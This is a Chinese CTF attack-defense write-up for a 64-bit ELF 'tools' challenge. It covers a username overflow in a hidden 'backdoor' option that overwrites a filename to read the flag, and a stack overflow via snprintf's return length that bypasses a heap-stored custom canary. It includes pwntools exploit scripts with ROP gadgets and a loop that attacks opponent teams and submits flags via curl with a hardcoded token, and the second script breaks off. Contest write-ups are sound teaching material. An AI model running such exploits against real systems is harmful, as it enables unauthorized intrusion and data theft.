# 2021年首届鹤城杯线下赛AWD-PWN Writeup
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## tools
题目环境：ubuntu16:04
题目信息：
    ❯ file tools
    tools: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3b786167921bb6dab6e69de7e5f074391f208825, stripped
    root@Radish /Desktop/pwn
    ❯ checksec --file=./tools
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable    FILE
    Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        4        ./tools
###  漏洞一
题目给了一个后门选项`666`，在`backdoor`函数中，在读入`Username`时，由于读入过长产生变量覆盖，可以覆盖到栈上的文件名，因此直接覆盖成flag的地址即可获取flag
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      sub_400AA5(a1, a2, a3);
      sub_400BC4();
      sub_401515();
      while ( 1 )
      {
        while ( 1 )
        {
          write(1, "CMD>> ", 6uLL);
          v3 = sub_400B87();
          if ( v3 == 2 )
            sub_4013FB();
          if ( v3 > 2 )
            break;
          if ( v3 != 1 )
            goto LABEL_13;
          sub_400D77();
        }
        if ( v3 == 3 )
          return 0LL;
        if ( v3 == 666 )
          backdoor();
    LABEL_13:
        puts("Invalid CMD");
      }
    }
    void __noreturn backdoor()
    {
      char v0; // [rsp+0h] [rbp-80h]
      __int64 v1; // [rsp+10h] [rbp-70h]
      char v2[88]; // [rsp+20h] [rbp-60h]
      int fd; // [rsp+78h] [rbp-8h]
      int i; // [rsp+7Ch] [rbp-4h]
      puts("If you want to renew the software, please enter your serial number on the official website!");
      puts("Now, enter your username and the software will generate a serial number for you~");
      strcpy((char *)&v1, "/dev/urandom");
      printf("UserName: ");
      sub_400B01(&v0, 32LL);
      fd = open((const char *)&v1, 0);
      read(fd, v2, 0x50uLL);
      close(fd);
      printf("%s's SerialNumber: ", &v0);
      for ( i = 0; i > ")
            sl("666")
            ru("UserName: ")
            payload = "a"*0x10+"/home/xctf/flag"
            sl(payload)
            rud("'s SerialNumber: ")
            data = rud("\n")
            flag = data.decode("hex")[:60]
            print flag
            # submit_flag(flag)
            payload = "curl http://192.168.20.100/api/v1/att_def/web/submit_flag/?event_id=6 -d \"flag={}&token=2uvsXchvDtj2VwMUESDfuEAjMBkKYVEKDmtDDrX44fTYG\"".format(flag)
            os.system(payload)
            index+=1
        except:
            print ip
            r.close()
    print "本轮共拿到"+str(index)+"个队伍的flag"
###  漏洞二
选项二实现了一个计算器的功能，在进入计算器功能前，用户可以进行输入用户名，代码如下所示：
    __int64 sub_401320()
    {
      __int64 result; // rax
      char s; // [rsp+0h] [rbp-30h]
      char v2; // [rsp+20h] [rbp-10h]
      int v3; // [rsp+24h] [rbp-Ch]
      __int64 v4; // [rsp+28h] [rbp-8h]
      v4 = sub_400F47();
      printf("UserName: ");
      sub_400B01(byte_6030A0, 0x48LL);
      v3 = snprintf(&s, 0x20uLL, "%s's calculator ^_^", byte_6030A0);// 栈溢出
      printf("CalcName: %s\n", &s);
      puts("Do you like the CalcName automatically generated by the system? [Y/N]");
      sub_400B01(&v2, 2LL);
      if ( v2 == 'N' )
      {
        printf("New CalcName: ");
        sub_400B01(&s, v3);
      }
      sub_4011F8();
      result = sub_400FD0();
      if ( result != v4 )
        exit(-1);
      return result;
    }
`sub_400B01(byte_6030A0,
0x48LL);`读入字符串后，又调用了`snprintf`函数对输入的字符串进行拼接，官方解释如下所示，返回值是欲写入的字符串长度。
在第一次读入用户名之后还有一次读入的机会，而第二次读入的长度是我们可控的，可以造成栈溢出。  
棘手的是，虽然程序没有开启Canary保护，但是程序中自己实现了canary保护的机制，canary经过调试发现是存在堆块上的。
现在需要来绕过canary的限制，接着进入到计算器的功能中，有加减乘除四个选项，每次计算之后都可以存储到堆上的一个位置。
这个位置是在canary之前的，而每次计算的值存到堆上的地址时依次增加的，所以我们如果计算多次的话，就可以覆盖到堆块上存储的canary。原理如下图所示：
在第二次输入Username的时候，就把canary设置成和覆盖的一样，就可以绕过canary的保护了，进而栈溢出拿flag即可。
exp_2：
    #coding:utf-8
    from pwn import *
    context.log_level='debug'
    AUTHOR="萝卜啊啊啊啊啊啊"
    debug = 1
    file_name = './tools'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    ip = ''
    prot = ''
    if debug:
        r = process(file_name)
        libc = ELF(libc_name)
    else:
        r = remote(ip,int(prot))
        libc = ELF(libc_name)
    def debug():
        gdb.attach(r)
        raw_input()
    file = ELF(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    def exp_sub(num1,num2,sign):
        ru("CMD>> ")
        sl("2")
        ru("Num1: ")
        sl(str(num1))
        ru("Num2: ")
        sl(str(num2))
        ru("Save? [Y/N]")
        sl(sign)
    start = 0x400990
    puts_plt = file.plt['puts']
    puts_got = file.got['puts']
    p_rdi = 0x0000000000401643# : pop rdi ; ret
    pp_rsi = 0x0000000000401641# : pop rsi ; pop r15 ; ret
    flag_str = 0x6030d4#/home/xctf/flag
    readflag_addr = 0x40148E
    ru("CMD>> ")
    sl("2")
    ru("UserName: ")